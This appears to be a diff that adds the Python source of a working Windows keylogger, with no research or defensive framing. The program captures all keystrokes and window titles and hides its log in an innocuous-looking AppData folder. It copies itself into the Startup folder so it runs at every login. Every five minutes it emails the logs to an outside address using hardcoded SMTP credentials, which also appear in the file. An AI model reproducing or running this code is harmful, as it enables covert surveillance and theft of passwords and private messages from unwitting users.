@@ -1,0 +1,200 @@
+import os
+import sys
+import time
+import threading
+import socket
+import getpass
+from datetime import datetime
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import smtplib
+from pynput import keyboard
+import ctypes
+from ctypes import wintypes
+import shutil
+
+APP_DATA_DIR = os.path.join(os.environ['APPDATA'], 'uonet_mm_proc')
+LOG_FILE = os.path.join(APP_DATA_DIR, 'data.dat')
+STARTUP_DIR = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+EXE_NAME = 'uonet_mm_proc.exe'
+SENDER_EMAIL = "myszard@cyberia.pl"
+SENDER_PASSWORD = "HALH-AMU8-YVRB-BNBW"
+RECEIVER_EMAIL = "fsociety@vp.pl"
+SMTP_SERVER = 'smtp.poczta.onet.pl'
+SMTP_PORT = 587
+SEND_INTERVAL = 300
+WINDOW_CHECK_INTERVAL = 10
+TEST_DELAY = 30
+
+input_buffer = []
+current_window = ""
+next_send_time = None
+key_listener = None
+window_thread = None
+send_thread = None
+running = True
+
+def get_computer_info():
+    hostname = socket.gethostname()
+    username = getpass.getuser()
+    return f"{hostname}-{username}"
+
+def get_window_title():
+    hwnd = ctypes.windll.user32.GetForegroundWindow()
+    if hwnd:
+        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
+        buf = ctypes.create_unicode_buffer(length + 1)
+        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
+        return buf.value
+    return ""
+
+def process_input(key):
+    global input_buffer, current_window
+    try:
+        if hasattr(key, 'char') and key.char:
+            input_buffer.append(key.char)
+        else:
+            key_str = str(key).replace('Key.', '').upper()
+            if key_str == 'SPACE':
+                input_buffer.append(' ')
+            elif key_str == 'ENTER' or key_str == 'ESC':
+                input_buffer.append('\n')
+            else:
+                input_buffer.append(f'[{key_str}]')
+        
+        new_window = get_window_title()
+        if new_window != current_window and new_window:
+            current_window = new_window
+            if input_buffer:
+                input_buffer[-1] += f"\n{current_window}: "
+            else:
+                input_buffer.append(f"{current_window}: ")
+    except Exception:
+        pass
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+
+def save_data():
+    global input_buffer, next_send_time
+    if input_buffer:
+        with open(LOG_FILE, 'a', encoding='utf-8') as f:
+            f.write(''.join(input_buffer) + '\n')
+        input_buffer.clear()
+        if next_send_time:
+            with open(LOG_FILE, 'a', encoding='utf-8') as f:
+                f.write(f"Next send: {datetime.fromtimestamp(next_send_time)}\n")
+
+def send_report(subject_suffix="", is_test=False, is_backlog=False):
+    global next_send_time
+    try:
+        if not os.path.exists(LOG_FILE):
+            return
+        
+        hostname_user = get_computer_info()
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M")
+        subject = f"{timestamp} {hostname_user}"
+        if is_backlog:
+            subject += " ZALEGLE"
+        elif is_test:
+            subject += " TEST"
+        
+        msg = MIMEMultipart()
+        msg['From'] = SENDER_EMAIL
+        msg['To'] = RECEIVER_EMAIL
+        msg['Subject'] = subject
+        
+        if is_test:
+            body = f"System active on {hostname_user}"
+            msg.attach(MIMEText(body, 'plain'))
+        else:
+            with open(LOG_FILE, 'r', encoding='utf-8') as f:
+                content = f.read()
+            msg.attach(MIMEText(content, 'plain'))
+        
+        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+        server.starttls()
+        server.login(SENDER_EMAIL, SENDER_PASSWORD)
+        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
+        server.quit()
+        
+        if not is_test and not is_backlog:
+            os.remove(LOG_FILE)
+            next_send_time = datetime.now().timestamp() + SEND_INTERVAL
+            save_data()
+    except Exception:
+        pass
+
+def report_loop():
+    global running
+    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
+        send_report(is_backlog=True)
+    
+    time.sleep(TEST_DELAY)
+    send_report(is_test=True)
+    
+    while running:
+        time.sleep(SEND_INTERVAL)
+        send_report()
+
+def monitor_loop():
+    global current_window
+    current_window = get_window_title()
+    while running:
+        time.sleep(WINDOW_CHECK_INTERVAL)
+        new_window = get_window_title()
+        if new_window != current_window and new_window:
+            current_window = new_window
+            if input_buffer:
+                input_buffer[-1] += f"\n{current_window}: "
+            else:
+                input_buffer.append(f"{current_window}: ")
+
+def setup():
+    if not os.path.exists(APP_DATA_DIR):
+        os.makedirs(APP_DATA_DIR)
+        src = sys.executable if getattr(sys, 'frozen', False) else __file__
+        dst = os.path.join(APP_DATA_DIR, EXE_NAME)
+        shutil.copy(src, dst)
+        
+        startup_target = os.path.join(STARTUP_DIR, EXE_NAME)
+        if not os.path.exists(startup_target):
+            shutil.copy(dst, startup_target)
+    
+    init_monitor()
+    global send_thread, window_thread
+    send_thread = threading.Thread(target=report_loop, daemon=True)
+    send_thread.start()
+    window_thread = threading.Thread(target=monitor_loop, daemon=True)
+    window_thread.start()
+
+def init_monitor():
+    global key_listener
+    key_listener = keyboard.Listener(on_press=process_input, on_release=on_release)
+    key_listener.start()
+    save_data()
+
+def write_next_send():
+    global next_send_time
+    if next_send_time:
+        with open(LOG_FILE, 'a', encoding='utf-8') as f:
+            f.write(f"Next send: {datetime.fromtimestamp(next_send_time)}\n")
+
+if __name__ == "__main__":
+    setup()
+    try:
+        while True:
+            time.sleep(1)
+            save_data()
+    except KeyboardInterrupt:
+        running = False
+        if key_listener:
+            key_listener.stop()
+                                                                                                                                                                          
+#                     _                                   _ _                            
+#  _ __ ___  ___  ___(_)_      ____ _     _ __ ___   __ _| (_)_ __   __ _   _____  _____ 
+# | '_ ` _ \/ __|/ __| \ \ /\ / / _` |   | '_ ` _ \ / _` | | | '_ \ / _` | / _ \ \/ / _ \
+# | | | | | \__ \ (__| |\ V  V / (_| |   | | | | | | (_| | | | | | | (_| ||  __/>  <  __/
+# |_| |_| |_|___/\___|_| \_/\_/ \__,_|___|_| |_| |_|\__,_|_|_|_| |_|\__,_(_)___/_/\_\___|
+#                                   |_____|                                                                                                                                       
